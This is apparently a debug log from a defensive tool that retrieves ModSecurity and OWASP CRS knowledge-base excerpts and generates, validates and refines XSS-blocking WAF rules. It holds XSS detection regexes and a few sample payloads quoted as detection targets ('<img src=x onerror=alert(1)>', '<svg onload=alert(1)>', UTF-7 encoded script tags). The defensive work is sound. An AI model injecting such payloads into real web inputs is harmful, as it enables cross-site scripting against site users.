"id:400006,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,t:compressWhitespace,deny,status:403,log,auditlog,msg:\'XSS payload detected after decoding and normalization\',tag:\'attack-xss\',severity:\'CRITICAL\'"\n```\n\n## 8.5 XSS Rule Generation Pattern\n\nRecommended XSS rule for request inputs:\n\n```apache\nSecRule ARGS|REQUEST_COOKIES|REQUEST_HEADERS "@rx <\\s*script\\b|onerror\\s*=|onload\\s*=|javascript:|<\\s*svg\\b|<\\s*img\\b" \\\n  "id:400100,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,t:compressWhitespace,deny,status:403,log,auditlog,msg:\'XSS payload detected in request input\',tag:\'attack-xss\',severity:\'CRITICAL\'"\n```\n\nFor specific parameter:\n```apache\n\n---\n[Reference 3]\nSource: modsecurity_crs_941_xss_rules_rag_optimized_knowledge_base.md\nType: Rules\nWAF: ModSecurity\nChunk: 22/74\nBlock types: [\'heading\', \'rule_block\', \'code_fence\', \'prose\']\nRaw rerank score: 1.093\n\nUseful excerpt:\nSecRule ARGS:q "@rx (?i)<script[^>]*>[\\s\\S]*?" \\\n\n  "id:100941110,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:\'Script tag XSS detected in q parameter\'"\n\n```\n\n---\n\n# 8. Rule 941120: XSS Category 2 Event Handler Vector\n\n## 8.1 Rule Identity\n\n```text\n\nRule ID: 941120\n\nParanoia level: PL1\n\nCategory: XSS Filter Category 2\n\nVector: Event handler injection\n\nOperator: @rx\n\n```\n\n## 8.2 Detection Intent\n\nDetect XSS vectors using HTML event handlers such as:\n\n```html\n\n<body onload="alert(1)">\n\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\n```\n\n## 8.3 Core Pattern\n\n```apache\n\n@rx (?i)[\\s"\'`;\\/0-9=\\x0B\\x09\\x0C\\x3B\\x2C\\x28\\x3B]on[a-zA-Z]+[\\s\\x0B\\x09\\x0C\\x3B\\x2C\\x28\\x3B]*?=\n\n```\n\nMeaning:\n\n- Requires context before the event handler such as whitespace, quote, slash, digit, equals, or delimiter.\n- Detects `on` followed by letters, such as `onerror`, `onload`, `onclick`, `onmouseover`.\n- Allows whitespace and delimiter obfuscation before `=`.\n\n## 8.4 Rule-Generation Use\n\nUse this rule concept when payloads contain:\n\n```text\n\nonerror=\nonload=\nonclick=\nonmouseover=\n\n```\n\nA compact generated rule:\n\n```apache\n\n---\n[Reference 4]\nSource: modsecurity_crs_941_xss_rules_rag_optimized_knowledge_base.md\nType: Rules\nWAF: ModSecurity\nChunk: 58/74\nBlock types: [\'heading\', \'rule_block\', \'code_fence\', \'prose\']\nRaw rerank score: 0.811\n\nUseful excerpt:\nSecRule ARGS "@rx (?i)<\\s*(script|svg|img)\\b|onerror\\s*=|javascript\\s*:" \\\n\n  "id:110005,phase:2,t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:\'Encoded XSS payload detected after normalization\'"\n\n```\n\n## 19.6 US-ASCII or UTF-7 Encoding XSS\n\nPayload examples:\n\n```text\n\n¼script¾alert(¢XSS¢)¼/script¾\n\n+ADw-script+AD4-alert(1)+ADw-/script+AD4-\n\n```\n\nRecommended CRS references:\n\n```text\n\n941310\n941350\n\n```\n\nGenerated rule pattern:\n\n```apache\n', 'queries': ['ModSecurity Stored XSS xss_stored rule syntax statement example fields action transformation', 'ModSecurity Stored XSS stored cross-site scripting stored XSS persistent XSS persistent cross-site scripting stored payload comment field XSS detection rule example request component text transformation', 'ModSecurity XSS rule detect script alert confirm onerror onload svg img src', 'Stored XSS xss_stored bypass normalization decoding canonicalization lowercase url decode html entity rule', 'ModSecurity inspect query string body headers cookies uri Stored XSS xss_stored rule statement', 'ModSecurity stored XSS persistent XSS form body comment profile field rule example', 'ModSecurity stored cross-site scripting payload request body arguments HTML input rule syntax', 'ModSecurity SecRule Stored XSS XSS variables operators transformations actions example', 'OWASP CRS XSS SQL injection SecRule ARGS REQUEST_BODY REQUEST_HEADERS'], 'score_note': 'Cross-encoder scores are raw logits; negative values are normal. Use rank/order, not absolute sign.', 'attack_type_input': 'xss_stored', 'attack_type_raw': 'xss_stored', 'attack_type_display': 'Stored XSS', 'attack_type_family': 'XSS', 'attack_terms': ['xss_stored', 'Stored XSS', 'XSS', 'stored cross-site scripting', 'stored XSS', 'persistent XSS', 'persistent cross-site scripting', 'stored payload', 'comment field XSS', 'profile field XSS', 'message body XSS', 'form body XSS', 'rich text field', 'HTML input stored'], 'waf_filtered': True, 'mapped_waf_name': 'ModSecurity'}
+[RAG] Queries :
+	ModSecurity Stored XSS xss_stored rule syntax statement example fields action transformation
+	ModSecurity Stored XSS stored cross-site scripting stored XSS persistent XSS persistent cross-site scripting stored payload comment field XSS detection rule example request component text transformation
+	ModSecurity XSS rule detect script alert confirm onerror onload svg img src
+	Stored XSS xss_stored bypass normalization decoding canonicalization lowercase url decode html entity rule
+	ModSecurity inspect query string body headers cookies uri Stored XSS xss_stored rule statement
+	ModSecurity stored XSS persistent XSS form body comment profile field rule example
+	ModSecurity stored cross-site scripting payload request body arguments HTML input rule syntax
+	ModSecurity SecRule Stored XSS XSS variables operators transformations actions example
+	OWASP CRS XSS SQL injection SecRule ARGS REQUEST_BODY REQUEST_HEADERS
+[RAG] Sources :
+	[kemp_loadmaster_modsecurity_waf_rule_writing_rag_optimized_knowledge_base.md]
+		[SecRule ARGS|REQUEST_HEADERS "@rx <\s*script\b|onerror\s*=|onload\s*=|javascript:" \
+		
+		  "id:200101,\
+		  phase:2,\
+		  deny,\
+		  status:403,\
+		  t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:removeNulls,t:lowercase,\
+		  log,\
+		  auditlog,\
+		  msg:'XSS payload detected in request input',\
+		  logdata:'%{MATCHED_VAR}',\
+		  tag:'attack-xss'"
+		
+		```
+		
+		Use narrower target if known:
+		
+		```apache
+		
+		SecRule ARGS:q "@rx <\s*script\b|onerror\s*=|javascript:" \
+		
+		  "id:200102,\
+		  phase:2,\
+		  deny,\
+		  status:403,\
+		  t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:removeNulls,t:lowercase,\
+		  log,\
+		  auditlog,\
+		  msg:'XSS payload detected in q parameter',\
+		  logdata:'%{MATCHED_VAR}',\
+		  tag:'attack-xss'"
+		
+		```
+		
+		## 20.2 SQL Injection Rule Guidance
+		
+		This LoadMaster guide does not provide a dedicated SQLi signature. For SQLi rule generation, prefer a CRS 942 SQLi knowledge base. If only this document is retrieved, use its ModSecurity mechanics and produce a conservative rule.
+		
+		Generic SQLi rule:
+		
+		```apache]
+	[modsecurity_making_rules_rag_optimized_knowledge_base.md]
+		[Better transformation order:
+		
+		```apache
+		SecRule ARGS "@rx <\s*script\b|onerror\s*=|javascript:" \
+		  "id:400006,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,t:compressWhitespace,deny,status:403,log,auditlog,msg:'XSS payload detected after decoding and normalization',tag:'attack-xss',severity:'CRITICAL'"
+		```
+		
+		## 8.5 XSS Rule Generation Pattern
+		
+		Recommended XSS rule for request inputs:
+		
+		```apache
+		SecRule ARGS|REQUEST_COOKIES|REQUEST_HEADERS "@rx <\s*script\b|onerror\s*=|onload\s*=|javascript:|<\s*svg\b|<\s*img\b" \
+		  "id:400100,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,t:compressWhitespace,deny,status:403,log,auditlog,msg:'XSS payload detected in request input',tag:'attack-xss',severity:'CRITICAL'"
+		```
+		
+		For specific parameter:
+		```apache]
+	[modsecurity_crs_941_xss_rules_rag_optimized_knowledge_base.md]
+		[SecRule ARGS:q "@rx (?i)<script[^>]*>[\s\S]*?" \
+		
+		  "id:100941110,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'Script tag XSS detected in q parameter'"
+		
+		```
+		
+		---
+		
+		# 8. Rule 941120: XSS Category 2 Event Handler Vector
+		
+		## 8.1 Rule Identity
+		
+		```text
+		
+		Rule ID: 941120
+		
+		Paranoia level: PL1
+		
+		Category: XSS Filter Category 2
+		
+		Vector: Event handler injection
+		
+		Operator: @rx
+		
+		```
+		
+		## 8.2 Detection Intent
+		
+		Detect XSS vectors using HTML event handlers such as:
+		
+		```html
+		
+		<body onload="alert(1)">
+		
+		<img src=x onerror=alert(1)>
+		<svg onload=alert(1)>
+		
+		```
+		
+		## 8.3 Core Pattern
+		
+		```apache
+		
+		@rx (?i)[\s"'`;\/0-9=\x0B\x09\x0C\x3B\x2C\x28\x3B]on[a-zA-Z]+[\s\x0B\x09\x0C\x3B\x2C\x28\x3B]*?=
+		
+		```
+		
+		Meaning:
+		
+		- Requires context before the event handler such as whitespace, quote, slash, digit, equals, or delimiter.
+		- Detects `on` followed by letters, such as `onerror`, `onload`, `onclick`, `onmouseover`.
+		- Allows whitespace and delimiter obfuscation before `=`.
+		
+		## 8.4 Rule-Generation Use
+		
+		Use this rule concept when payloads contain:
+		
+		```text
+		
+		onerror=
+		onload=
+		onclick=
+		onmouseover=
+		
+		```
+		
+		A compact generated rule:
+		
+		```apache]
+	[modsecurity_crs_941_xss_rules_rag_optimized_knowledge_base.md]
+		[SecRule ARGS "@rx (?i)<\s*(script|svg|img)\b|onerror\s*=|javascript\s*:" \
+		
+		  "id:110005,phase:2,t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'Encoded XSS payload detected after normalization'"
+		
+		```
+		
+		## 19.6 US-ASCII or UTF-7 Encoding XSS
+		
+		Payload examples:
+		
+		```text
+		
+		¼script¾alert(¢XSS¢)¼/script¾
+		
+		+ADw-script+AD4-alert(1)+ADw-/script+AD4-
+		
+		```
+		
+		Recommended CRS references:
+		
+		```text
+		
+		941310
+		941350
+		
+		```
+		
+		Generated rule pattern:
+		
+		```apache]
+127.0.0.1 - - [10/May/2026 15:24:04] "POST /api/defend/2-rag-retrieve HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:24:04] "OPTIONS /api/defend/3-generate-rules HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:24:19] "POST /api/defend/3-generate-rules HTTP/1.1" 400 -
+127.0.0.1 - - [10/May/2026 15:24:41] "OPTIONS /api/defend/3-generate-rules HTTP/1.1" 200 -
+[GENERATE-RULES] Generated 8 rules
+	SecAction "id:210000,phase:1,pass,nolog,t:none,t:utf8toUnicode,t:urlDecodeUni,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,t:compressWhitespace,setvar:'tx.xss_norm_ready=1'"
+		Instructions: Normalization pre-step for early request processing. Applies repeated URL decoding plus Unicode/entity/script/style decoding and whitespace compression so doubly/triply encoded payloads are normalized before downstream signature evaluation.
+	SecRule ARGS|ARGS_NAMES|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES|XML:/* "@rx (?:(?:<|&lt;|%3c)\s*(?:script|svg|img|body|iframe|audio)\b|(?:<|&lt;|%3c)\s*/\s*script\b|(?:src|href)\s*=\s*[\"'`]?\s*javascript\s*:|\bon[a-z]{3,24}\b\s*[\x00-\x20\"'`;/(),-]*=)" "id:210001,phase:2,deny,status:403,log,auditlog,t:none,t:utf8toUnicode,t:urlDecodeUni,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,t:compressWhitespace,msg:'XSS normalized tag/event-handler pattern detected',logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',tag:'attack-xss',severity:'CRITICAL'"
+		Instructions: Primary normalized signature. Covers script/svg/img/body/iframe/audio vectors, event handlers like onload/onerror/onkeydown, and javascript: URI usage after multi-layer decoding and canonicalization.
+	SecRule ARGS|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES "@rx <\s*(?:img|svg|body|audio|iframe)\b[^>]{0,256}\bon[a-z]{3,24}\b\s*=|<\s*script\b[^>]{0,256}>|<\s*/\s*script\s*>" "id:210002,phase:2,deny,status:403,log,auditlog,t:none,t:utf8toUnicode,t:urlDecodeUni,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,msg:'XSS active tag with executable attribute detected',logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',tag:'attack-xss',severity:'CRITICAL'"
+		Instructions: Focused HTML execution rule for executable tags and event-bearing attributes. Intended to catch direct and lightly obfuscated forms with lower false positives than broad event-handler-only matching.
+	SecRule ARGS|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?:/\*[^*]{0,32}\*/|--[!\d]{0,16}|&#(?:x0*2f|0*47);|%2f|/)[^>]{0,64}\bon[a-z]{3,24}\b\s*=|<\s*(?:img|svg)\s*/\*[^*]{0,32}\*/[^>]{0,128}\bon[a-z]{3,24}\b\s*=" "id:210003,phase:2,deny,status:403,log,auditlog,t:none,t:utf8toUnicode,t:urlDecodeUni,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,t:compressWhitespace,msg:'XSS comment or separator obfuscation detected',logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',tag:'attack-xss',severity:'CRITICAL'"
+		Instructions: Obfuscation-focused rule for comment injection and separator tricks such as /*...*/, encoded slashes, and delimiter padding between tag name and executable attribute.
+	SecRule ARGS|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES "@rx \b(?:alert|confirm|prompt)\s*\(|\b(?:activexobject|xmlhttp|msxml2\.xmlhttp)\b|\bonreadystatechange\b\s*=|\bxhr\s*=\s*new\b|\bopen\s*\(\s*[\"'`]get[\"'`]" "id:210004,phase:2,deny,status:403,log,auditlog,t:none,t:utf8toUnicode,t:urlDecodeUni,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,t:compressWhitespace,msg:'XSS script execution or ActiveX XMLHttp pattern detected',logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',tag:'attack-xss',severity:'CRITICAL'"
+		Instructions: Script-content rule for encoded script blocks and legacy JavaScript execution patterns seen in the bypass set, including alert/confirm, ActiveXObject, XMLHttp, and onreadystatechange chains.
+	SecRule ARGS|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?:(?:%25){2,}|(?:&#(?:x[0-9a-f]{2,5}|\d{2,7});){3,}|(?:%u[0-9a-f]{4}){2,}|(?:[0-9a-f]{2}%){4,})" "id:210005,phase:2,log,auditlog,pass,t:none,t:lowercase,msg:'Anomaly: excessive multi-layer encoding indicative of obfuscation',logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',tag:'attack-obfuscation',severity:'WARNING',setvar:'tx.anomaly_score=+5'"
+		Instructions: Behavioral/anomaly rule for excessive encoding density. Does not deny by itself; logs and increases anomaly score so heavily encoded probes can be challenged or blocked by policy.
+	SecRule ARGS|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?:[\x{ff01}-\x{ff5e}]|[\x80-\x{024f}]){6,}" "id:210006,phase:2,log,auditlog,pass,t:none,msg:'Anomaly: unusual Unicode density in request input',logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',tag:'attack-obfuscation',severity:'WARNING',setvar:'tx.anomaly_score=+4'"
+		Instructions: Flags payloads using dense non-ASCII and fullwidth/homoglyph-style characters often used to disguise XSS markers. Recommended as anomaly-only to reduce false positives for legitimate internationalized traffic.
+	SecRule TX:ANOMALY_SCORE "@ge 10" "id:210007,phase:2,deny,status:403,log,auditlog,t:none,msg:'Inbound request blocked by XSS/obfuscation anomaly threshold',tag:'attack-anomaly',severity:'CRITICAL'"
+		Instructions: Threshold enforcement. Blocks requests that accumulate enough suspicious encoding/obfuscation signals even if no single signature fires conclusively.
+127.0.0.1 - - [10/May/2026 15:25:08] "POST /api/defend/3-generate-rules HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:25:12] "OPTIONS /api/defend/4-validate-rules HTTP/1.1" 200 -
+[VALIDATION] 8 valid rules, 0 invalid rules
+127.0.0.1 - - [10/May/2026 15:25:12] "POST /api/defend/4-validate-rules HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:25:30] "OPTIONS /api/defend/6-refine-rules HTTP/1.1" 200 -
+[REFINE] Refining 8 rules with 45 existing rules
+[REFINE] Valid rules to refine:
+	SecAction "id:210000,phase:1,pass,nolog,t:none,t:utf8toUnicode,t:urlDecodeUni,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,t:compressWhitespace,setvar:'tx.xss_norm_ready=1'"
+		Instructions: Normalization pre-step for early request processing. Applies repeated URL decoding plus Unicode/entity/script/style decoding and whitespace compression so doubly/triply encoded payloads are normalized before downstream signature evaluation.
+	SecRule ARGS|ARGS_NAMES|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES|XML:/* "@rx (?:(?:<|&lt;|%3c)\s*(?:script|svg|img|body|iframe|audio)\b|(?:<|&lt;|%3c)\s*/\s*script\b|(?:src|href)\s*=\s*[\"'`]?\s*javascript\s*:|\bon[a-z]{3,24}\b\s*[\x00-\x20\"'`;/(),-]*=)" "id:210001,phase:2,deny,status:403,log,auditlog,t:none,t:utf8toUnicode,t:urlDecodeUni,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,t:compressWhitespace,msg:'XSS normalized tag/event-handler pattern detected',logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',tag:'attack-xss',severity:'CRITICAL'"
+		Instructions: Primary normalized signature. Covers script/svg/img/body/iframe/audio vectors, event handlers like onload/onerror/onkeydown, and javascript: URI usage after multi-layer decoding and canonicalization.
+	SecRule ARGS|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES "@rx <\s*(?:img|svg|body|audio|iframe)\b[^>]{0,256}\bon[a-z]{3,24}\b\s*=|<\s*script\b[^>]{0,256}>|<\s*/\s*script\s*>" "id:210002,phase:2,deny,status:403,log,auditlog,t:none,t:utf8toUnicode,t:urlDecodeUni,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,msg:'XSS active tag with executable attribute detected',logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',tag:'attack-xss',severity:'CRITICAL'"
+		Instructions: Focused HTML execution rule for executable tags and event-bearing attributes. Intended to catch direct and lightly obfuscated forms with lower false positives than broad event-handler-only matching.
+	SecRule ARGS|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?:/\*[^*]{0,32}\*/|--[!\d]{0,16}|&#(?:x0*2f|0*47);|%2f|/)[^>]{0,64}\bon[a-z]{3,24}\b\s*=|<\s*(?:img|svg)\s*/\*[^*]{0,32}\*/[^>]{0,128}\bon[a-z]{3,24}\b\s*=" "id:210003,phase:2,deny,status:403,log,auditlog,t:none,t:utf8toUnicode,t:urlDecodeUni,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,t:compressWhitespace,msg:'XSS comment or separator obfuscation detected',logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',tag:'attack-xss',severity:'CRITICAL'"
+		Instructions: Obfuscation-focused rule for comment injection and separator tricks such as /*...*/, encoded slashes, and delimiter padding between tag name and executable attribute.
+	SecRule ARGS|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES "@rx \b(?:alert|confirm|prompt)\s*\(|\b(?:activexobject|xmlhttp|msxml2\.xmlhttp)\b|\bonreadystatechange\b\s*=|\bxhr\s*=\s*new\b|\bopen\s*\(\s*[\"'`]get[\"'`]" "id:210004,phase:2,deny,status:403,log,auditlog,t:none,t:utf8toUnicode,t:urlDecodeUni,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,t:compressWhitespace,msg:'XSS script execution or ActiveX XMLHttp pattern detected',logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',tag:'attack-xss',severity:'CRITICAL'"
+		Instructions: Script-content rule for encoded script blocks and legacy JavaScript execution patterns seen in the bypass set, including alert/confirm, ActiveXObject, XMLHttp, and onreadystatechange chains.
+	SecRule ARGS|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?:(?:%25){2,}|(?:&#(?:x[0-9a-f]{2,5}|\d{2,7});){3,}|(?:%u[0-9a-f]{4}){2,}|(?:[0-9a-f]{2}%){4,})" "id:210005,phase:2,log,auditlog,pass,t:none,t:lowercase,msg:'Anomaly: excessive multi-layer encoding indicative of obfuscation',logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',tag:'attack-obfuscation',severity:'WARNING',setvar:'tx.anomaly_score=+5'"
+		Instructions: Behavioral/anomaly rule for excessive encoding density. Does not deny by itself; logs and increases anomaly score so heavily encoded probes can be challenged or blocked by policy.
+	SecRule ARGS|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?:[\x{ff01}-\x{ff5e}]|[\x80-\x{024f}]){6,}" "id:210006,phase:2,log,auditlog,pass,t:none,msg:'Anomaly: unusual Unicode density in request input',logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',tag:'attack-obfuscation',severity:'WARNING',setvar:'tx.anomaly_score=+4'"
+		Instructions: Flags payloads using dense non-ASCII and fullwidth/homoglyph-style characters often used to disguise XSS markers. Recommended as anomaly-only to reduce false positives for legitimate internationalized traffic.
+	SecRule TX:ANOMALY_SCORE "@ge 10" "id:210007,phase:2,deny,status:403,log,auditlog,t:none,msg:'Inbound request blocked by XSS/obfuscation anomaly threshold',tag:'attack-anomaly',severity:'CRITICAL'"
+		Instructions: Threshold enforcement. Blocks requests that accumulate enough suspicious encoding/obfuscation signals even if no single signature fires conclusively.
+[REFINE] Existing rules:
+	SecRule TX:DETECTION_PARANOIA_LEVEL "@lt 1" "id:941011,phase:1,pass,nolog,tag:'OWASP_CRS',ver:'OWASP_CRS/4.26.0-dev',skipAfter:END-REQUEST-941-APPLICATION-ATTACK-XSS"
+	SecRule TX:DETECTION_PARANOIA_LEVEL "@lt 1" "id:941012,phase:2,pass,nolog,tag:'OWASP_CRS',ver:'OWASP_CRS/4.26.0-dev',skipAfter:END-REQUEST-941-APPLICATION-ATTACK-XSS"
+	SecRule REQUEST_FILENAME "!@validateByteRange 20,45-47,48-57,65-90,95,97-122"  "id:941010, phase:1, pass, t:none, nolog, tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', ctl:ruleRemoveTargetByTag=xss-perf-disable;REQUEST_FILENAME, ver:'OWASP_CRS/4.26.0-dev'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS:User-Agent|ARGS_NAMES|ARGS|XML:/* "@detectXSS"  "id:941100, phase:2, block, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'XSS Attack Detected via libinjection', logdata:'Matched Data: XSS data found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-multi', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|REQUEST_HEADERS|!REQUEST_HEADERS:Cookie|ARGS_NAMES|ARGS|XML:/* "@rx (?i)<script[^>]*>[\s\S]*?"  "id:941110, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'XSS Filter - Category 1: Script Tag Vector', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-multi', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS|!REQUEST_HEADERS:Cookie|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i)[\t-\r \"'\(,/-9;=`]on[a-z]{3,50}[\t-\r \(,;]*?=[^=]"  "id:941120, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'XSS Filter - Category 2: Event Handler Vector', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-multi', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS:User-Agent|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i).(?:\b(?:(?:x(?:link:href|html|mlns)|data:text/html|formaction)\b|pattern[\s\x0b]*=)|(?:!ENTITY[\s\x0b]+(?:%[\s\x0b]+)?[^\s\x0b]+[\s\x0b]+(?:SYSTEM|PUBLIC)|@import|;base64)\b)"  "id:941130, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'XSS Filter - Category 3: Attribute Vector', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-multi', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS:User-Agent|REQUEST_HEADERS:Referer|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i)[a-z]+=(?:[^:=]+:.+;)*?[^:=]+:url\(javascript"  "id:941140, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:removeWhitespace, msg:'XSS Filter - Category 4: Javascript URI Vector', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-multi', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
